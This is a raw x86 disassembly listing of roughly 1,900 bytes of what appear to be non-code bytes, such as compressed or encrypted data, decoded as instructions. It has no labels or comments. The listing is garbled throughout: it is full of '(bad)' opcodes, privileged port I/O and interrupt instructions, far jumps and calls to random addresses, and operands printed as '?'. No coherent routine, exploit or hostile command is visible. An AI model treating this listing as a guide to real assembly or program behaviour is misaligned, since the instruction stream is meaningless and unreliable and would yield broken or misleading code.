  413f3a:	xor    al,0x91
  413f3c:	mov    bl,0x6e
  413f3e:	fnstcw WORD PTR [esi-0xd]
  413f41:	xor    al,0x6
  413f43:	imul   edx,DWORD PTR [ebp-0x354f2499],0xffffff90
  413f4a:	sub    esi,esp
  413f4c:	mov    eax,0xf2c98ee2
  413f51:	and    esi,esp
  413f53:	cmp    al,0x8e
  413f55:	jbe    0x413f76
  413f57:	enter  0x5f60,0x39
  413f5b:	mov    dh,0x76
  413f5d:	ds aaa 
  413f5f:	xchg   DWORD PTR [esi+edi*4-0x38],eax
  413f63:	xor    eax,0xab0405eb
  413f68:	mov    al,ds:0xaab542df
  413f6d:	sub    BYTE PTR [ebx+0x3d],0x29
  413f71:	cmp    al,0x3a
  413f73:	mov    ebx,0x7c61c6cc
  413f78:	jmp    0x6977e26f
  413f7d:	mov    dh,0x5f
  413f7f:	mov    esi,0x4c8d9fd7
  413f84:	ret    
  413f85:	sub    DWORD PTR [edx+0x30],esp
  413f88:	es jl  0x413f32
  413f8b:	mov    ecx,0xece2b359
  413f90:	mov    ds:0x3bbe7981,al
  413f95:	scas   al,BYTE PTR es:[edi]
  413f96:	inc    eax
  413f97:	mov    ah,0x33
  413f99:	jmp    0x413fbf
  413f9b:	add    al,0x59
  413f9d:	mov    cl,0x8e
  413f9f:	mov    ebx,0xc7574027
  413fa4:	sbb    BYTE PTR [ebx],dl
  413fa6:	xchg   DWORD PTR [esi],esi
  413fa8:	lods   al,BYTE PTR ds:[esi]
  413fa9:	addr16 push esi
  413fab:	test   BYTE PTR [ebx],bh
  413fad:	ror    ebp,0x52
  413fb0:	es xor ah,cl
  413fb3:	iret   
  413fb4:	sahf   
  413fb5:	repnz sub BYTE PTR [eax],bh
  413fb8:	ds popf 
  413fba:	sub    al,BYTE PTR [ecx-0x764f377a]
  413fc0:	stos   BYTE PTR es:[edi],al
  413fc1:	into   
  413fc2:	mov    ss,eax
  413fc4:	jl     0x413f70
  413fc6:	xchg   DWORD PTR [edi+eax*8-0x72645536],esi
  413fcd:	xchg   esi,eax
  413fce:	dec    ebp
  413fcf:	push   ss
  413fd0:	mov    ecx,0x1b8fb2a4
  413fd5:	push   esi
  413fd6:	dec    ecx
  413fd7:	mov    edi,0x75eb4ac8
  413fdc:	adc    esi,esi
  413fde:	mov    al,0x47
  413fe0:	xchg   ecx,eax
  413fe1:	arpl   di,ax
  413fe3:	cdq    
  413fe4:	sti    
  413fe5:	jne    0x413fae
  413fe7:	pusha  
  413fe8:	mov    bl,0x68
  413fea:	xlat   BYTE PTR ds:[ebx]
  413feb:	push   esi
  413fec:	xor    BYTE PTR [ebx],bh
  413fee:	ins    DWORD PTR es:[edi],dx
  413fef:	and    edx,DWORD PTR gs:[ebx+0x32d155e4]
  413ff6:	pop    ds
  413ff7:	jmp    0x82a86e7e
  413ffc:	xor    cl,al
  413ffe:	sub    ebx,esi
  414000:	fcom   DWORD PTR [eax-0x1804740]
  414006:	jecxz  0x414035
  414008:	mov    bh,0x34
  41400a:	rcl    edi,0xb2
  41400d:	popa   
  41400e:	lahf   
  41400f:	and    ebp,DWORD PTR [eax+0x4f3c41bf]
  414015:	std    
  414016:	adc    bh,ah
  414018:	xchg   ebx,eax
  414019:	jo     0x413fa8
  41401b:	das    
  41401c:	or     al,0x9b
  41401e:	add    al,0x6d
  414020:	mov    edx,0x118d6a20
  414025:	push   cs
  414026:	and    eax,0x3e69f870
  41402b:	cmp    BYTE PTR [esi+eax*2+0x5b6b6b47],al
  414032:	les    ecx,FWORD PTR [edx-0x6]
  414035:	sar    DWORD PTR [ebp+0x71014907],cl
  41403b:	dec    esi
  41403c:	mov    dh,0x81
  41403e:	ret    
  41403f:	and    ebx,0xe9a3c699
  414045:	shr    eax,1
  414047:	xor    eax,0xffdec58b
  41404c:	dec    esi
  41404d:	and    BYTE PTR [edi+0x28fc7f5a],bl
  414053:	test   al,0x82
  414055:	loopne 0x414015
  414057:	mov    ecx,DWORD PTR [esi+0x2ea47a72]
  41405d:	sbb    DWORD PTR [eax-0x2],ecx
  414060:	cmp    BYTE PTR [edi-0x73],ch
  414063:	inc    esp
  414064:	push   ss
  414065:	(bad)  
  414066:	test   eax,0x886e95f
  41406b:	loopne 0x4140b0
  41406d:	dec    ebx
  41406e:	and    al,0xd9
  414070:	(bad)  
  414071:	mov    ah,0x2c
  414073:	xlat   BYTE PTR ds:[ebx]
  414074:	mov    edi,0x10e7e102
  414079:	fmul   QWORD PTR [ebp+0x7c]
  41407c:	fidivr DWORD PTR [eax-0x41]
  41407f:	arpl   bx,dx
  414081:	imul   edi,DWORD PTR [edx],0x77aa99f8
  414087:	mov    gs,edx
  414089:	mov    esi,0x567d040f
  41408e:	out    0x1d,al
  414090:	call   DWORD PTR [edx+0x51]
  414093:	adc    al,0xe7
  414095:	and    al,0xf0
  414097:	cmp    cl,bl
  414099:	fsubrp st(5),st
  41409b:	inc    edi
  41409c:	push   es
  41409d:	rcr    BYTE PTR [esi+0x605cbc25],0xc0
  4140a4:	adc    esp,ebp
  4140a6:	in     eax,dx
  4140a7:	ins    BYTE PTR es:[edi],dx
  4140a8:	outs   dx,DWORD PTR ds:[esi]
  4140a9:	imul   esi,DWORD PTR [ebx+0x1cbd1e6a],0x72
  4140b0:	xchg   ebp,eax
  4140b1:	mov    eax,0x1abb59e
  4140b6:	sbb    DWORD PTR [ebp+0x4b],ebx
  4140b9:	jp     0x4140ed
  4140bb:	or     esi,DWORD PTR [ebx+0x20]
  4140be:	fisubr DWORD PTR [esi]
  4140c0:	xor    bh,BYTE PTR [ebp-0x3f]
  4140c3:	sub    eax,DWORD PTR [ebx-0x11]
  4140c6:	stos   DWORD PTR es:[edi],eax
  4140c7:	pop    ecx
  4140c8:	icebp  
  4140c9:	jae    0x414096
  4140cb:	push   edx
  4140cc:	jp     0x414101
  4140ce:	or     eax,0x86f470ca
  4140d3:	push   cs
  4140d4:	sahf   
  4140d5:	pop    eax
  4140d6:	ret    
  4140d7:	ja     0x41405a
  4140d9:	sbb    edi,ecx
  4140db:	jns    0x414099
  4140dd:	xor    BYTE PTR [esi+edi*4+0x37be093a],al
  4140e4:	not    DWORD PTR [ebx+0x7422f3d6]
  4140ea:	int3   
  4140eb:	sub    cl,cl
  4140ed:	sar    BYTE PTR [ebp+0x1afeb21a],cl
  4140f3:	push   0xc3f62ad6
  4140f8:	in     eax,dx
  4140f9:	sbb    DWORD PTR [esp+ecx*1-0x123bdc18],ecx
  414100:	add    al,0x78
  414102:	sbb    al,0xa2
  414104:	sbb    al,bh
  414106:	sbb    eax,0xdc83fa7f
  41410b:	iret   
  41410c:	jae    0x414184
  41410e:	inc    ebx
  41410f:	pop    ds
  414110:	cld    
  414111:	mov    ebp,0x61b36d1a
  414116:	add    BYTE PTR [edx+0x62f34fa6],dh
  41411c:	cld    
  41411d:	loop   0x4140d4
  41411f:	xor    ecx,DWORD PTR [ecx]
  414121:	imul   edx,ecx,0xeae57a94
  414127:	dec    esp
  414128:	sete   BYTE PTR [ecx-0x55613c8]
  41412f:	mov    dh,0x92
  414131:	sub    al,0xa2
  414133:	(bad)  
  414134:	mov    bl,BYTE PTR [ecx+0x604646ed]
  41413a:	in     eax,0xda
  41413c:	mov    eax,0x42011f89
  414141:	jl     0x4141a0
  414143:	lods   al,BYTE PTR ds:[esi]
  414144:	pop    ds
  414145:	cmp    al,0x5f
  414147:	scas   eax,DWORD PTR es:[edi]
  414148:	push   edi
  414149:	sbb    dh,dl
  41414b:	mov    dl,0x34
  41414d:	jl     0x41410d
  41414f:	jae    0x41412d
  414151:	stos   BYTE PTR es:[edi],al
  414152:	lahf   
  414153:	push   es
  414154:	inc    esp
  414155:	sub    DWORD PTR [ecx],ecx
  414157:	sbb    BYTE PTR [eax+esi*8+0x61da41db],dh
  41415e:	jge    0x4140f7
  414160:	push   ecx
  414161:	mov    ecx,0x4e561efe
  414166:	jnp    0x41412f
  414168:	and    eax,0x6bd76fb9
  41416d:	and    BYTE PTR [ecx-0x43],dl
  414170:	div    BYTE PTR [esi]
  414172:	inc    esp
  414173:	push   es
  414174:	test   al,dl
  414176:	xchg   edx,eax
  414177:	push   ss
  414178:	mov    dh,0x92
  41417a:	and    DWORD PTR [edi+0x71],0x2a880cdf
  414181:	and    dh,BYTE PTR [ebx+eax*4+0x31]
  414185:	pop    ss
  414186:	mov    ds:0x6d3014de,eax
  41418b:	(bad)  
  41418d:	in     al,0xaa
  41418f:	cs inc edi
  414191:	fadd   QWORD PTR [ebp+0x389ca9d2]
  414197:	add    al,0xd9
  414199:	cs push edi
  41419b:	and    al,0x2c
  41419d:	jno    0x41412d
  41419f:	fnstcw WORD PTR [edi]
  4141a1:	mov    ds:0x8bf75bf2,eax
  4141a6:	mov    dh,0xbe
  4141a8:	jns    0x414136
  4141aa:	in     al,dx
  4141ab:	pop    eax
  4141ac:	aam    0x48
  4141ae:	icebp  
  4141af:	les    ebp,FWORD PTR [eax-0x37]
  4141b2:	sti    
  4141b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141b4:	push   eax
  4141b5:	or     eax,DWORD PTR gs:[esi-0x50f92d39]
  4141bc:	ds inc edx
  4141be:	pop    ebx
  4141bf:	rcl    cl,1
  4141c1:	add    edi,DWORD PTR [ecx-0x31]
  4141c4:	and    BYTE PTR [ebp+edx*2-0x79],ah
  4141c8:	adc    ebp,DWORD PTR [edx+0x10af6da2]
  4141ce:	fsub   QWORD PTR [edx*4+0x530de506]
  4141d5:	fsubr  QWORD PTR [ebp+0x44539593]
  4141db:	ja     0x414248
  4141dd:	stos   BYTE PTR es:[edi],al
  4141de:	data16 sar BYTE PTR [eax-0x1c],0x8f
  4141e3:	out    0xf3,eax
  4141e5:	ins    DWORD PTR es:[edi],dx
  4141e6:	mov    dh,0xd8
  4141e8:	adc    edx,DWORD PTR cs:[ebx-0x65688c]
  4141ef:	sub    al,0xa8
  4141f1:	or     al,0x50
  4141f3:	push   ecx
  4141f4:	pop    es
  4141f5:	ds scas al,BYTE PTR es:[edi]
  4141f7:	mov    dh,BYTE PTR [edx+0x1f]
  4141fa:	jge    0x414187
  4141fc:	jb     0x41419c
  4141fe:	les    ebx,FWORD PTR [esi]
  414200:	mul    DWORD PTR [edx]
  414202:	in     al,0xb1
  414204:	sbb    edi,ebp
  414206:	int3   
  414207:	bound  edx,QWORD PTR [edi-0x54]
  41420a:	jbe    0x41422a
  41420c:	xchg   esp,eax
  41420d:	cwde   
  41420e:	inc    ecx
  41420f:	and    edx,DWORD PTR [ebp-0x6c54b63d]
  414215:	sldt   WORD PTR [esi+ebp*8]
  414219:	mov    al,ds:0xc7ba7993
  41421e:	inc    edi
  41421f:	xchg   ebx,eax
  414220:	mov    eax,ds:0xba896918
  414225:	xchg   DWORD PTR [eax],ebp
  414227:	fs pop edi
  414229:	inc    ecx
  41422a:	add    eax,0x5ee29f19
  41422f:	sub    BYTE PTR [edi-0x7409c070],0x27
  414236:	add    edx,DWORD PTR [eax]
  414238:	cmp    edi,DWORD PTR [edi+0xbb90fec]
  41423e:	outs   dx,BYTE PTR ds:[esi]
  41423f:	mov    al,ds:0xfc88acb6
  414244:	call   0x1ced35e3
  414249:	cli    
  41424a:	test   DWORD PTR [ebp+0x519dc7fb],esi
  414250:	repnz test BYTE PTR ds:0x3e77f59,0xee
  414258:	dec    edx
  414259:	shr    DWORD PTR [ecx+0x3],cl
  41425c:	or     BYTE PTR [edi+0x75],cl
  41425f:	push   eax
  414260:	or     al,0xcc
  414262:	xchg   DWORD PTR [ebx],edx
  414264:	adc    edx,DWORD PTR [edx-0x25c4cdc3]
  41426a:	shl    BYTE PTR ds:0x97133d54,1
  414270:	jle    0x414253
  414272:	cmp    BYTE PTR [eax+eiz*2],dl
  414275:	shr    BYTE PTR [ebx-0x4d50e889],0x9
  41427c:	fcomip st,st(1)
  41427e:	cmp    al,0xf6
  414280:	pop    DWORD PTR [esi-0x6d5e48bf]
  414286:	rcl    ebp,cl
  414288:	stos   DWORD PTR es:[edi],eax
  414289:	ins    BYTE PTR es:[edi],dx
  41428a:	adc    ecx,DWORD PTR [edx]
  41428c:	sti    
  41428d:	test   eax,0xf7b30d92
  414292:	jb     0x4142ff
  414294:	das    
  414295:	sbb    edi,edx
  414297:	mov    cl,BYTE PTR [eax+0x58be8b88]
  41429d:	add    edx,esp
  41429f:	scas   eax,DWORD PTR es:[edi]
  4142a0:	nop
  4142a1:	inc    edi
  4142a2:	pop    ss
  4142a3:	ins    DWORD PTR es:[edi],dx
  4142a4:	or     WORD PTR [ebx+0x261dd4e6],bx
  4142ab:	aad    0x6b
  4142ad:	cmp    DWORD PTR [ecx],ebx
  4142af:	cs pusha 
  4142b1:	pop    ecx
  4142b2:	fbld   TBYTE PTR [edx+ebp*1+0x36]
  4142b6:	mul    DWORD PTR [edx]
  4142b8:	ins    BYTE PTR es:[edi],dx
  4142b9:	xor    eax,0xf9b905e4
  4142be:	inc    ecx
  4142bf:	ret    
  4142c0:	push   esi
  4142c1:	adc    dh,BYTE PTR [esi+edi*8-0x44]
  4142c5:	or     DWORD PTR [edi-0x2f],esp
  4142c8:	jbe    0x41431a
  4142ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142cb:	and    al,0xc7
  4142cd:	sub    dl,BYTE PTR [esi-0x7c]
  4142d0:	ss clc 
  4142d2:	push   es
  4142d3:	jnp    0x414267
  4142d5:	xchg   ebx,eax
  4142d6:	ins    BYTE PTR es:[edi],dx
  4142d7:	and    DWORD PTR [edx],ecx
  4142d9:	and    bl,ch
  4142db:	jmp    0x414269
  4142dd:	xchg   esi,eax
  4142de:	sub    BYTE PTR [ebp-0x68],ah
  4142e1:	cmp    eax,0x842ae51d
  4142e6:	(bad)  
  4142e7:	mov    ebp,DWORD PTR [edx+0x54]
  4142ea:	cmp    eax,DWORD PTR [ebx]
  4142ec:	jmp    0x57b15c25
  4142f1:	mov    ah,0x8
  4142f3:	test   eax,0x5fdfbd82
  4142f8:	bnd jns 0x414302
  4142fb:	sub    eax,0xf0a19260
  414300:	xor    al,0xac
  414302:	into   
  414303:	ins    BYTE PTR es:[edi],dx
  414304:	push   ss
  414305:	mov    esp,DWORD PTR [edx-0x59]
  414308:	or     eax,0x2f42fd0f
  41430d:	or     esp,DWORD PTR ds:0x8be3ac6c
  414313:	hlt    
  414314:	push   0x2b
  414316:	cmp    al,0xf4
  414318:	clc    
  414319:	push   cs
  41431a:	lds    esp,FWORD PTR [esi-0x72]
  41431d:	call   0xfa20:0x24c15df9
  414324:	jg     0x4142bd
  414326:	in     eax,0xf4
  414328:	xor    eax,esp
  41432a:	push   ebp
  41432b:	loop   0x41435e
  41432d:	jo     0x414337
  41432f:	inc    ecx
  414330:	lock addr16 jns 0x41434b
  414334:	push   edi
  414335:	stos   DWORD PTR es:[edi],eax
  414336:	xor    DWORD PTR [ecx+0x25],edi
  414339:	fs mov ah,0xf2
  41433c:	jb     0x414378
  41433e:	aaa    
  41433f:	add    eax,0x150a5af3
  414344:	test   BYTE PTR [ebx],cl
  414346:	call   0x28dc:0x1c08593c
  41434d:	cwde   
  41434e:	mov    ah,0x10
  414350:	cld    
  414351:	test   eax,esp
  414353:	in     al,dx
  414354:	fcmovne st,st(6)
  414356:	into   
  414357:	hlt    
  414358:	pop    edi
  414359:	push   esp
  41435a:	sti    
  41435b:	fs bound edi,QWORD PTR ds:[ecx]
  41435f:	xor    eax,0xad4bc713
  414364:	jno    0x4142ee
  414366:	jmp    0x4d460fb4
  41436b:	pushf  
  41436c:	sub    ah,cl
  41436e:	xor    al,0xc7
  414370:	jmp    0xbbe3:0x89dd21c5
  414377:	fstcw  WORD PTR [ecx+0x29b68924]
  41437e:	fs pop edi
  414380:	push   cs
  414381:	into   
  414382:	push   ss
  414383:	push   0x52
  414385:	cld    
  414386:	jmp    0x414379
  414388:	sub    al,0x61
  41438a:	test   al,0xd2
  41438c:	pop    edi
  41438d:	test   al,bh
  41438f:	stos   BYTE PTR es:[edi],al
  414390:	gs cmp dh,cl
  414393:	stos   BYTE PTR es:[edi],al
  414394:	in     al,dx
  414395:	retf   
  414396:	inc    eax
  414397:	imul   bh
  414399:	mov    ch,0xbc
  41439b:	jb     0x414325
  41439d:	dec    ebp
  41439e:	cmp    eax,0xdd093d24
  4143a3:	adc    dl,BYTE PTR [edi+0x7e]
  4143a6:	pop    es
  4143a7:	les    edx,FWORD PTR ss:[ebx]
  4143aa:	pop    esi
  4143ab:	xchg   esi,eax
  4143ac:	dec    DWORD PTR [ebx]
  4143ae:	js     0x414369
  4143b0:	shr    bl,1
  4143b2:	fidivr WORD PTR [edx+0x77]
  4143b5:	sbb    eax,0x5bff7bb3
  4143ba:	add    eax,0x2b56a96c
  4143bf:	lahf   
  4143c0:	jbe    0x414352
  4143c2:	mov    ebx,0x87f16c3
  4143c7:	pop    eax
  4143c8:	sbb    DWORD PTR [edi],esi
  4143ca:	scas   al,BYTE PTR es:[edi]
  4143cb:	rol    ebx,1
  4143cd:	mov    edx,0x4257d18b
  4143d2:	lds    ecx,FWORD PTR [edi-0x56]
  4143d5:	push   edx
  4143d6:	test   DWORD PTR [edi],edi
  4143d8:	fdiv   DWORD PTR [ebx+0x1bf556ec]
  4143de:	stos   DWORD PTR es:[edi],eax
  4143df:	pop    eax
  4143e0:	cdq    
  4143e1:	push   ds
  4143e2:	retf   
  4143e3:	pop    ss
  4143e4:	and    dh,cl
  4143e6:	fucomip st,st(6)
  4143e8:	inc    ecx
  4143e9:	popa   
  4143ea:	iret   
  4143eb:	leave  
  4143ec:	and    BYTE PTR [ecx+0x68],ah
  4143ef:	xchg   ecx,eax
  4143f0:	or     ebp,DWORD PTR [ebp-0x6f]
  4143f3:	mov    ecx,0x5b458e0a
  4143f8:	fcmovnbe st,st(3)
  4143fa:	cs xor al,dh
  4143fd:	cwde   
  4143fe:	adc    eax,0x71d4bdf7
  414403:	sbb    al,0xf7
  414405:	out    dx,eax
  414406:	pop    esi
  414407:	outs   dx,DWORD PTR ds:[esi]
  414408:	jmp    0x4143f6
  41440a:	test   DWORD PTR ds:0x9f2ea1b7,edx
  414410:	mov    ?,WORD PTR [edx]
  414412:	lods   al,BYTE PTR ds:[esi]
  414413:	fnstenv [esp+eiz*8+0xe02959]
  41441a:	pop    edx
  41441b:	dec    ecx
  41441c:	xor    al,BYTE PTR [edx+0x2e6dae4b]
  414422:	out    0x2b,eax
  414424:	xchg   ebp,eax
  414425:	xor    ecx,DWORD PTR [ecx-0x3d65fea2]
  41442b:	cmc    
  41442c:	imul   DWORD PTR [eax+0x74179083]
  414432:	or     DWORD PTR [esp+ecx*2],edi
  414435:	cmp    esi,0xa5264c62
  41443b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41443c:	repz mov fs,eax
  41443f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414440:	jl     0x41445b
  414442:	mov    bl,0xb8
  414444:	lds    esi,FWORD PTR [ebp-0x2f]
  414447:	cmp    esi,DWORD PTR [ebx+edx*8]
  41444a:	mov    WORD PTR [edx],?
  41444c:	mov    ah,0xf9
  41444e:	jbe    0x414423
  414450:	inc    ebx
  414451:	(bad)
  414454:	mov    edx,0xd36e13de
  414459:	sub    ebx,DWORD PTR [ecx]
  41445b:	lods   al,BYTE PTR ds:[esi]
  41445c:	mov    edx,0x25b95000
  414461:	(bad)  
  414462:	jno    0x414483
  414464:	xchg   ecx,eax
  414465:	in     al,dx
  414466:	mov    BYTE PTR [edi],bh
  414468:	xchg   ebx,eax
  414469:	or     al,0x59
  41446b:	mov    edi,0xe1439a2d
  414470:	xchg   ebx,eax
  414471:	daa    
  414472:	push   edx
  414473:	or     BYTE PTR [esp+eax*1],bl
  414476:	xor    al,0x3b
  414478:	aad    0x67
  41447a:	mov    ch,BYTE PTR [eax]
  41447c:	push   esi
  41447d:	and    al,0x27
  41447f:	out    dx,al
  414480:	xor    ah,BYTE PTR [ebp-0x2958aa06]
  414486:	loop   0x4144c6
  414488:	jo     0x414463
  41448a:	xchg   esi,eax
  41448b:	mov    dh,0x2
  41448d:	scas   al,BYTE PTR es:[edi]
  41448e:	inc    ebx
  41448f:	xor    eax,0x137553e
  414494:	adc    DWORD PTR [ebp+0x6d],0xffffffb4
  414498:	hlt    
  414499:	adc    ecx,esi
  41449b:	sub    bh,bl
  41449d:	scas   eax,DWORD PTR es:[edi]
  41449e:	jae    0x414469
  4144a0:	add    DWORD PTR [edi+0x4],ecx
  4144a3:	adc    cl,BYTE PTR [ebx-0x2f322077]
  4144a9:	adc    eax,0x28d6a727
  4144ae:	push   cs
  4144af:	jle    0x414432
  4144b1:	xor    eax,0xe2b92d49
  4144b6:	and    eax,0xda80543d
  4144bb:	dec    ecx
  4144bc:	into   
  4144bd:	mov    ss,WORD PTR [ebx]
  4144bf:	add    BYTE PTR [edx],dh
  4144c1:	aaa    
  4144c2:	jnp    0x414529
  4144c4:	bound  esp,QWORD PTR ds:0x858a8737
  4144ca:	dec    esp
  4144cb:	stos   BYTE PTR es:[edi],al
  4144cc:	mov    edi,0xd525bcfa
  4144d1:	call   0x51fbd108
  4144d6:	mov    esi,0x73d1e991
  4144db:	and    al,ah
  4144dd:	mov    al,0xe5
  4144df:	ins    DWORD PTR es:[edi],dx
  4144e0:	sti    
  4144e1:	cmp    ebp,DWORD PTR [ecx]
  4144e3:	sub    bh,BYTE PTR [ebp-0x6255882d]
  4144e9:	add    al,0x8b
  4144eb:	inc    esp
  4144ec:	jb     0x41449c
  4144ee:	push   cs
  4144ef:	pushf  
  4144f0:	cwde   
  4144f1:	xchg   ebx,eax
  4144f2:	xlat   BYTE PTR ds:[ebx]
  4144f3:	stos   DWORD PTR es:[edi],eax
  4144f4:	mov    eax,0x7f37de58
  4144f9:	outs   dx,BYTE PTR ds:[esi]
  4144fa:	clc    
  4144fb:	lds    edi,FWORD PTR [edi+0x4fd950f2]
  414501:	fcomip st,st(4)
  414503:	pop    esp
  414504:	aaa    
  414505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414506:	(bad)  
  414507:	push   esi
  414508:	cmp    al,0xc7
  41450a:	xor    ebx,DWORD PTR [edi]
  41450c:	call   0x5937ded3
  414511:	retf   
  414512:	mov    ecx,0x470f56d4
  414517:	lods   al,BYTE PTR ds:[esi]
  414518:	es nop
  41451a:	xlat   BYTE PTR ds:[ebx]
  41451b:	pop    edi
  41451c:	ss sub ebx,eax
  41451f:	fisubr WORD PTR [esi+0x500ec530]
  414525:	ret    0x46e
  414528:	daa    
  414529:	popf   
  41452a:	bound  ecx,QWORD PTR [eax+0x1d]
  41452d:	sar    BYTE PTR [ebx+0x6b],1
  414530:	and    edx,0x6b
  414533:	mov    eax,ds:0xa5ec4fe4
  414538:	call   0xa8aa4a5e
  41453d:	enter  0x113c,0x93
  414541:	(bad)  
  414542:	je     0x4145b4
  414544:	xchg   ebx,eax
  414545:	xor    edi,esp
  414547:	xlat   BYTE PTR ds:[ebx]
  414548:	push   ecx
  414549:	add    al,0xd8
  41454b:	sub    DWORD PTR [edi-0x73],esi
  41454e:	test   eax,0xe9774b9e
  414553:	sbb    BYTE PTR [esp+ebx*4],ah
  414556:	jecxz  0x414553
  414558:	jecxz  0x41456c
  41455a:	add    DWORD PTR [edx+0x6ef948c4],esp
  414560:	mov    ch,0x8f
  414562:	xchg   ecx,eax
  414563:	daa    
  414564:	add    BYTE PTR [edx],cl
  414566:	sbb    edx,esi
  414568:	jmp    0xc2b5:0xdc652c80
  41456f:	pop    edx
  414570:	call   0xe4f8b213
  414575:	icebp  
  414576:	push   ss
  414577:	adc    DWORD PTR [edi-0x8],0x83948af0
  41457e:	mov    ?,WORD PTR [edi-0x94b4e22]
  414584:	aad    0x95
  414586:	fisttp QWORD PTR [eax]
  414588:	test   esp,ecx
  41458a:	dec    ebx
  41458b:	iret   
  41458c:	bound  ebx,QWORD PTR [ebx+edi*1+0x730b35e0]
  414593:	cdq    
  414594:	int3   
  414595:	lahf   
  414596:	jle    0x4145f0
  414598:	xchg   ebp,eax
  414599:	jne    0x41451f
  41459b:	test   dl,0x98
  41459e:	dec    esp
  41459f:	sbb    eax,0xc96c21e0
  4145a4:	jge    0x41459f
  4145a6:	inc    edi
  4145a7:	xchg   ebp,eax
  4145a8:	stos   DWORD PTR es:[edi],eax
  4145a9:	dec    ecx
  4145aa:	push   es
  4145ab:	icebp  
  4145ac:	ins    BYTE PTR es:[edi],dx
  4145ad:	aaa    
  4145ae:	jp     0x414570
  4145b0:	xor    eax,0x1bf6a370
  4145b5:	(bad)  
  4145b6:	fcomp  DWORD PTR [eax-0x17]
  4145b9:	mov    DWORD PTR [ebx],edx
  4145bb:	lods   al,BYTE PTR ds:[esi]
  4145bc:	xor    BYTE PTR [edi+0x47194e48],bh
  4145c2:	inc    ebx
  4145c3:	cmp    DWORD PTR [edx],ecx
  4145c5:	push   ecx
  4145c6:	ret    0x2608
  4145c9:	jo     0x4145d0
  4145cb:	fstp   TBYTE PTR [ecx-0x26]
  4145ce:	push   cs
  4145cf:	and    ebx,ebx
  4145d1:	ins    DWORD PTR es:[edi],dx
  4145d2:	dec    esp
  4145d3:	hlt    
  4145d4:	sbb    DWORD PTR [esi+edx*4+0x5a],edx
  4145d8:	ret    0x14a7
  4145db:	call   FWORD PTR [ecx+0x4fcae34a]
  4145e1:	(bad)  
  4145e2:	lahf   
  4145e3:	xor    DWORD PTR [ebp-0x6a6d9d3c],eax
  4145e9:	adc    DWORD PTR [esi+eiz*1-0x3c7c0c55],0x55d92117
  4145f4:	pop    ss
  4145f5:	packsswb mm1,QWORD PTR [edi+0x1a6e0ccb]
  4145fc:	xlat   BYTE PTR ds:[ebx]
  4145fd:	adc    BYTE PTR [edi],dh
  4145ff:	cmp    cl,ah
  414601:	out    dx,al
  414602:	lock dec eax
  414604:	pop    ecx
  414605:	call   0xfddb:0x1938c2a6
  41460c:	add    eax,0x21577761
  414611:	outs   dx,DWORD PTR ds:[esi]
  414612:	push   ds
  414613:	mov    al,0x83
  414615:	shl    esp,1
  414617:	pop    eax
  414618:	hlt    
  414619:	mov    al,0x87
  41461b:	adc    DWORD PTR [eax-0x64282712],esi
  414621:	xchg   esp,eax
  414622:	cmp    edx,0x35a0ad4a
  414628:	sbb    edx,ecx
  41462a:	xor    bl,bl
  41462c:	dec    ebx
  41462d:	jecxz  0x4145b1
  41462f:	sbb    eax,0x429aaa63
  414634:	fidiv  WORD PTR [ecx-0x25]
  414637:	xor    edi,DWORD PTR [eax-0x4a]
  41463a:	js     0x41464a
  41463c:	fs xor al,dh
  41463f:	pop    ds
  414640:	repz cmp edi,DWORD PTR [esi+0x1c]
  414644:	push   ebp
  414645:	pop    ss
  414646:	pusha  
  414647:	push   cs
  414648:	xor    eax,0x393914cb
  41464d:	in     eax,0xfd
  41464f:	dec    esp
  414650:	jns    0x41465e
  414652:	mov    bl,0x3b
  414654:	xchg   edx,eax
  414655:	in     al,dx
  414656:	jle    0x41465c
  414658:	xchg   esi,eax
  414659:	or     dl,bh
  41465b:	stos   BYTE PTR es:[edi],al
  41465c:	dec    esp
  41465d:	cmp    esi,DWORD PTR [eax-0x791c4346]
  414663:	(bad)  
  414664:	lods   al,BYTE PTR ds:[esi]
  414665:	aad    0x56
  414667:	rcl    DWORD PTR [edx+0x250007a2],1
  41466d:	int    0xee
  41466f:	out    dx,eax
  414670:	ss mov dl,0xef
  414673:	lods   al,BYTE PTR ds:[esi]
  414674:	xchg   ebx,eax
  414675:	mov    esp,es
  414677:	popa   
  414678:	xchg   DWORD PTR [edi-0x13],ecx
  41467b:	mov    dl,0x3
  41467d:	xchg   DWORD PTR [edi-0x4],edi
  414680:	in     eax,dx
  414681:	outs   dx,BYTE PTR ds:[esi]
  414682:	mov    esp,ebx
  414684:	cmp    eax,esp
  414686:	pop    ebp
  414687:	pop    ds
  414688:	(bad)  
  41468a:	cli    
  41468b:	cmp    al,0xac
  41468d:	xchg   edx,eax
  41468e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41468f:	pop    esi
  414690:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414691:	mov    eax,0x1045fd15
  414696:	aas    
  414697:	out    dx,al
  414698:	adc    BYTE PTR [eax],bh
  41469a:	pop    ebp
  41469b:	jbe    0x41462e
  41469d:	jmp    0x95ed29e6
  4146a2:	xchg   DWORD PTR [eax-0x3b5cdafa],edi
  4146a8:	shr    BYTE PTR [eax+0x70899081],cl
  4146ae:	ror    DWORD PTR [ecx-0x18],0x0
  4146b2:	cmp    al,0x8b
  4146b4:	xor    al,0x45
  4146b6:	mov    ds:0x565f4628,eax
  4146bb:	aad    0xeb
  4146bd:	int3   
  4146be:	test   BYTE PTR [esi-0x47147881],dl
  4146c4:	enter  0x1274,0xea
  4146c8:	jl     0x41468f
  4146ca:	dec    eax
  4146cb:	pop    edx
  4146cc:	mov    bh,0x37
  4146ce:	fisttp QWORD PTR [edx-0x818889d]
  4146d4:	lea    edi,[edi]
  4146d6:	push   edx
  4146d7:	pop    ss
  4146d8:	stos   DWORD PTR es:[edi],eax
  4146d9:	adc    BYTE PTR [edi+0x1a],dh
  4146dc:	popf   
  4146dd:	add    DWORD PTR [esi-0x4e],esi
  4146e0:	in     eax,0xd7
  4146e2:	sahf   
  4146e3:	test   al,0xe8
  4146e5:	mov    ebx,0xb91c2a59
  4146ea:	sub    esp,esi
  4146ec:	test   al,0xf0
  4146ee:	das    
  4146ef:	out    dx,al
  4146f0:	adc    BYTE PTR [edi+0x6e],0x81
  4146f4:	fwait
  4146f5:	ds ins DWORD PTR es:[edi],dx
  4146f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
